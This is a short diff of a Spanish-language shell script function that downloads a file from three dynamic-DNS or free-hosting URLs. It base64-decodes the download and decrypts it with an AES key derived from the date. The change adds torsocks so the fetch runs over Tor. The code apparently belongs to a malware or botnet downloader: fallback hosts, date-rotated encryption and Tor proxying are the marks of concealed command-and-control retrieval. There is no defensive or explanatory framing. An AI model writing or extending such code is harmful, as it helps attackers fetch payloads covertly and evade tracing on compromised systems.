@@ -71,7 +71,8 @@ obtenerFichero() {
    TEMP=$2
    URLS="http://ubuin.hopto.org/$FICHERO http://xyz.hit.to/$FICHERO http://ganimedes.esy.es/$FICHERO.html"
    for URL in $URLS; do
-      wget -O - $URL 2> /dev/null | base64 -d | openssl enc -d -aes-256-ctr -k "clave$(date -u +'%Y-%m-%d')" > $TEMP
+      if [ "$(which torsocks)" != "" ]; then PROXY_CMD="$(which torsocks)"; else PROXY_CMD=""; fi
+      $PROXY_CMD wget -O - $URL 2> /dev/null | base64 -d | openssl enc -d -aes-256-ctr -k "clave$(date -u +'%Y-%m-%d')" > $TEMP
       if [ "$(cat $TEMP)" = "" ];then continue; fi
       NUM_LINEAS=$(cat $TEMP | wc -l)
       if [ "$NUM_LINEAS" -le 4 ];then continue; fi
